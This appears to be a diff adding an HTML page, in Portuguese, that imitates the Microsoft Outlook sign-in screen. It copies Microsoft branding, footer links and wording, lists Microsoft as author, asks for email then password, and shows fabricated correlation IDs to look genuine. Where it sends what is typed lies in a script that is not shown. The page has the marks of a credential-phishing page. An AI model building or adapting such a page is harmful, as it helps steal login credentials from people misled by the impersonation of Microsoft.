@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang='pt-BR'>
+    <head>
+        <!-- 
+            ! description => Adicionar as discrição do WebSite.
+            ! author => Adicionar quem foi o desenvolvedor do WebSite.
+            ! robots => Gerar um arquivo que permitir os quais browsers que pode acessar o WebSite. [ E adicionar na raiz do WebSite ]
+            ? Gerar robots.txt : https://smallseotools.com/pt/robots-txt-generator/
+            ? Tudo sobre o robots.txt https://developers.google.com/search/docs/advanced/robots/create-robots-txt
+            ! canonical => Para unir o SEO da sua página em um determinado link. Caso seu site seja acessível via: www e sem www, vc pode optar por focar a indexação em apenas um deles.
+            ! sitemap => Gerar sitemap https://www.xml-sitemaps.com  [ E adicionar na raiz do WebSite ]
+            ! base => Pegar um base na Web pra pegar IMG ou outros arquivo.
+            ! stylesheet => Adicionar um styles do CSS na Pagina.
+            ! Gerar os metas tags pra Google e Facebook etc... [ https://metatags.io/ ]
+            ! Gerar os icon das Paginas.. [ https://www.favicon-generator.org/ ]
+        -->
+        <meta charset='UTF-8'>
+        <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+        <meta name='description' content='Conectar a Outlook'>
+        <meta name='author' content='Microsoft'>
+        <meta name='robots' content='index, follow' />
+        <meta name='title' content='Conectar a Outlook'>
+        <title>Conectar a Outlook</title>
+        <link rel="shortcut icon" href="./assets/img/favicon.ico">
+        <!-- <link rel='canonical' href='https://www.' /> -->
+        <!-- <link rel='sitemap' type='application/xml' href='sitemap.xml' /> -->
+        <!-- <link rel='base' href='' /> -->
+
+        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.2/css/all.css">
+        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.2/css/sharp-thin.css">
+        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.2/css/sharp-solid.css">
+        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.2/css/sharp-regular.css">
+        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.2/css/sharp-light.css">
+        <link rel='stylesheet' type='text/css' href='./assets/css/main.css'>
+        <script type='module' src='./assets/js/script.js' defer></script>
+    </head>
+    <body>
+        <form></form>
+        <section class="main">
+            <div class="container">
+                <div class="main-center">
+                    <div class="main-logo">
+                        <img src="./assets/img/logo.png">
+                    </div>
+                    <div class="main-context">
+                        <div class="login">
+                            <div class="login-logo">
+                                <img src="./assets/img/logo.svg">
+                            </div>
+                            <div class="login-email">
+                                <h3>Entrar<span>Continuar para Outlook</span></h3>
+                                <div class="error-email">
+                                    <h5 class="display-error">Essa conta Microsoft não existe. Insira uma conta diferente ou <span class="create-account"> obtenha uma nova.</span></h5>
+                                </div>
+                                <input class="email" type="email" required placeholder="Insira o seu email, telefone ou Skype.">
+                                <h4>Não tem uma conta? <span class="create-account">Crie uma!</span></h4>
+                                <div>
+                                    <button class="btn_email">Avançar</button>
+                                </div>
+                            </div>
+                            <div class="login-password">
+                                <h3 class="display-check"></h3>
+                                <h6>Insira a senha</h6>
+                                <input class="password" type="password" required placeholder="Senha">
+                                <h4 class="password-what">Esqueceu a senha?</h4>
+                                <h4 class="password-what">Outras maneiras de entrar</h4>
+                                <div>
+                                    <button class="btn_password">Avançar</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="main-keys">
+                        <i class="fa-regular fa-key"></i>
+                        <h3>Opções de entrada</h3>
+                    </div>
+
+                    <div class="main-info">
+                        <div class="main-info-first">
+                            <h3>Detalhes da solução de problemas</h3>
+                            <i class="fa-solid fa-xmark"></i>
+                        </div>
+                        <h3>Se você entrar em contato com o administrador, envie estas informações para ele.</h3>
+                        <h4>Copiar informações para a área de transferência</h4>
+                        <h5><span>Correlation Id:</span> <span class="create-id"></span></h5>
+                        <h5><span>Timestamp:</span> <span class="create-date"></span></h5>
+                    </div>
+                    
+                </div>
+            </div>
+        </section>
+        <div class="footer">
+            <a href="https://www.microsoft.com/servicesagreement/">Termos e uso</a>
+            <a href="https://privacy.microsoft.com/privacystatement">Privacidade e cookies</a>
+            <i class="fa-solid fa-ellipsis"></i>
+        </div>
+    </body>
+</html>
